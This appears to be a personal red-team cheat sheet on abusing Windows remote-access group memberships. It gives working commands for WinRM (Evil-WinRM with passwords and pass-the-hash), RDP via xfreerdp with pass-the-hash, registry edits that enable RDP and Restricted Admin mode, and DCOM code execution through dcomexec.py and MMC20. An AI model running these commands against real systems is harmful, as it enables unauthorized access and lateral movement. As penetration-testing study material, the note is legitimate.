---
created: 2026-09-03
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
> [!abstract]+ **Scope**: Privilege escalation through membership in the `Remote Management Users`, `Remote Desktop Users`, and `Distributed COM Users` groups.

- [ ] Confirm membership in `Remote Management Users`, `Remote Desktop Users`, or `Distributed COM Users` groups (`whoami /groups` or `net localgroup`).
- [ ] Connect via WinRM using Evil-WinRM or `Enter-PSSession` if in `Remote Management Users`.
- [ ] Establish graphical remote desktop sessions using `xfreerdp` or `mstsc.exe` if in `Remote Desktop Users`.
- [ ] Execute RPC calls over DCOM using `dcomexec.py` if in `Distributed COM Users`.
- [ ] Enumerate internal services and local privilege escalation vectors within the established remote shell.
---
## Remote access groups

>The **`Remote Management Users`**, **`Remote Desktop Users`**, and **`Distributed COM Users`** groups are built-in Windows security groups that allow members to **access systems remotely** without full local administrative rights.

- **`Remote Management Users`**: Grants access to the Windows Remote Management (WinRM) service over HTTP (TCP port `5985`) and HTTPS (TCP port `5986`), permitting interactive PowerShell execution.
- **`Remote Desktop Users`**: Grants permissions to log on interactively via Remote Desktop Protocol (RDP / TCP port `3389`).
- **`Distributed COM Users`**: Grants permissions to launch, activate, and interact with Distributed Component Object Model (DCOM) objects remotely over RPC (TCP port `135`).

## Checking group membership

- Check group memberships for your active Windows session:

```powershell
whoami /groups
```

```powershell
net user %USERNAME%
```

- Enumerate members of remote access groups on a local host:

```powershell
Get-LocalGroupMember -Group "Remote Management Users"
```

```powershell
Get-LocalGroupMember -Group "Remote Desktop Users"
```

```powershell
Get-LocalGroupMember -Group "Distributed COM Users"
```

## Accessing WinRM with `Remote Management Users`

- Members of `Remote Management Users` can authenticate via WinRM to obtain interactive PowerShell access.

### Interactive access using `Evil-WinRM`

- Connect to the target host from a Linux attacker machine:

```bash
evil-winrm -i 10.10.11.5 -u 'jdoe' -p 'passwd123'
```

- Authenticate using Pass-the-Hash when NTLM hashes are available:

```bash
evil-winrm -i 10.10.11.5 -u 'jdoe' -H '2b576acfd5e0c865136732c44b49b6b1'
```

### Native PowerShell remoting

- Connect from a Windows host using `Enter-PSSession`:

```powershell
Enter-PSSession -ComputerName 10.10.11.5 -Credential (Get-Credential)
```

- Run individual commands remotely using `Invoke-Command`:

```powershell
Invoke-Command -ComputerName 10.10.11.5 -ScriptBlock { Get-Process } -Credential (Get-Credential)
```

## Accessing RDP with Remote Desktop Users

- Accounts in `Remote Desktop Users` can initiate interactive graphical sessions over RDP (TCP port `3389`).

### Connecting via xfreerdp

- Launch an RDP session from Linux using `xfreerdp`:

```bash
xfreerdp /v:10.10.11.5 /u:'jdoe' /p:'passwd123' /dynamic-resolution /drive:share,/tmp
```

- Connect using Pass-the-Hash via restricted admin mode:

```bash
xfreerdp /v:10.10.11.5 /u:'jdoe' /pth:'2b576acfd5e0c865136732c44b49b6b1' /pth
```

### Enabling RDP and Restricted Admin Mode remotely

- If RDP is disabled or Restricted Admin Mode is turned off, modify registry settings when appropriate write permissions exist:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## Executing code via DCOM with Distributed COM Users

- Members of `Distributed COM Users` can instantiate DCOM objects remotely over RPC (TCP port `135`) to achieve code execution.

### Remote execution using dcomexec.py

- Execute commands over DCOM objects (`MMC20.Application`, `ShellWindows`, or `ShellCustom`) using Impacket:

```bash
dcomexec.py -object MMC20 example.com/jdoe:'passwd123'@10.10.11.5
```

| Parameter | Description |
| :--- | :--- |
| `-object MMC20` | Specifies target DCOM object (`MMC20.Application`). |
| `example.com/jdoe...` | Target domain credentials and target host IP address. |

### Manual PowerShell DCOM instantiation

- Instantiate a remote DCOM object via PowerShell:

```powershell
$dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.11.5"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Windows\Temp\out.txt", "7")
```

>[!tip]+
> - Confirm target port accessibility before initiating connection:
>
> ```bash
> netexec smb 10.10.11.5 -u 'jdoe' -p 'passwd123' --winrm
> ```

## References and further reading

- [`Remote Management Users — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#remote-management-users)
- [`Remote Desktop Users — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#remote-desktop-users)
- [`Abusing DCOM for remote execution — Red Team Notes`](https://www.ired.team/offensive-security/lateral-movement/t1175-executing-code-via-dcom-plus-oo-by-abusing-mmc20.application-object)
